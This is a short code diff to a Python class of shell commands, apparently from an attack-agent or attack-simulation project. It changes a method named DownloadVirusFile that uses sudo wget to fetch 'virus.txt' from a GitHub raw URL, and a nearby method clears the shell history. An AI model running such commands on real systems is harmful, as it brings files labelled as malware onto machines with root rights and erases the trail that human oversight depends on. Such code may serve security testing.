@@ -65,7 +65,7 @@ class BashCommands:
         return RunSubProcess("history -c")
 
     def DownloadVirusFile(self):
-        return RunSubProcess("sudo wget /home https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")
+        return RunSubProcess("sudo mkdir -p ~/virus;sudo wget -O ~/virus/virus.txt https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt")
 
 
 class BashCommandsHelp:
